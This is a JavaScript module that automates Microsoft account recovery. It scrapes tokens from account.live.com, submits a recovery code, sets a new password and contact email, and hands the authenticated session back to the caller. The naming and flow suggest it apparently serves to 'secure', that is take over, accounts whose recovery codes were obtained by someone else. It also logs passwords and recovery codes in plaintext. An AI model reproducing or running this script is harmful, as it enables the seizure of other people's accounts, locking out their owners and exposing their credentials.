const HttpClient = require("../process/HttpClient");

module.exports = async (email, recoveryCode, secEmail, password) => {
    console.log(`Recovery secure called with ${email} ${recoveryCode} ${secEmail} ${password}`);

    try {
        const axios = new HttpClient();

        const data = await axios.get(
            `https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/oauth20_authorize.srf&mn=${email}`,
            { proxy: false }
        );

        if (data?.data.includes("reset-password-signinname_en")) {
            console.log(`Invalid email!`);
            return null;
        }

        let serverData = null;
        const match = data.data.match(/var\s+ServerData=(.*?)(?=;|$)/);
        if (!match) return null;
        serverData = JSON.parse(match[1]);

        let d = axios.getCookie('amsc');

        if (!serverData?.sRecoveryToken || !d || !serverData?.apiCanary) {
            console.log(`Returning early cause of missing details`);
            return null;
        }

        const recTokenResponse = await axios.post(
            "https://account.live.com/API/Recovery/VerifyRecoveryCode",
            {
                publicKey: "2CBB3761027476727BDDBC9DE02870BE01ED793A",
                recoveryCode: recoveryCode,
                code: recoveryCode,
                scid: 100103,
                token: decodeURIComponent(serverData.sRecoveryToken),
                uiflvr: 1001,
            },
            {
                headers: {
                    "Content-type": "application/json; charset=utf-8",
                    "canary": serverData.apiCanary,
                }
            }
        );

        if (!recTokenResponse?.data?.token) {
            return "invalid";
        }

        const maxRetries = 3;
        for (let attempt = 0; attempt <= maxRetries; attempt++) {
            try {
                console.log(`Recovery attempt ${attempt + 1}`);

                const recoveryResponse = await axios.post(
                    "https://account.live.com/API/Recovery/RecoverUser",
                    {
                        contactEmail: secEmail,
                        contactEpid: "",
                        password: password,
                        passwordExpiryEnabled: 0,
                        publicKey: "2CBB3761027476727BDDBC9DE02870BE01ED793A",
                        token: decodeURIComponent(recTokenResponse.data.token),
                    },
                    {
                        headers: {
                            "Content-type": "application/json; charset=utf-8",
                            "Canary": serverData.apiCanary,
                        }
                    }
                );

                let d = JSON.stringify(recoveryResponse?.data);
                console.log(`recovery log: ${d}`);

                if (recoveryResponse?.data?.error) {
                    if (recoveryResponse.data.error.code === "6001") {
                        console.log(`tfa issue!`);
                        return "tfa";
                    } else if (recoveryResponse.data.error.code === "1218") {
                        console.log(`Returning same!`);
                        return "same";
                    }
                }

                if (recoveryResponse?.data?.apiCanary) {
                    return {
                        email2: email,
                        recoveryCode: recoveryResponse.data.recoveryCode,
                        secEmail: secEmail,
                        password: password,
                        axiosInstance: axios  // pass authenticated session to caller
                    };
                }

            } catch (error) {
                console.error(`Recovery attempt ${attempt + 1} failed:`, error.message);

                const errData = error.response?.data;

                if (errData?.error) {
                    if (errData.error.code === "6001") {
                        return "tfa";
                    } else if (errData.error.code === "1218") {
                        return "same";
                    }
                }

                if (attempt === maxRetries) {
                    if (errData?.apiCanary) {
                        return {
                            email2: email,
                            recoveryCode: errData.recoveryCode,
                            secEmail: secEmail,
                            password: password,
                            axiosInstance: axios  // pass authenticated session even on last retry success
                        };
                    }
                    return "invalid";
                }
            }
        }
    } catch (error) {
        console.error('Error in recovery process:', error.message);
        return "invalid";
    }

    return "invalid";
};
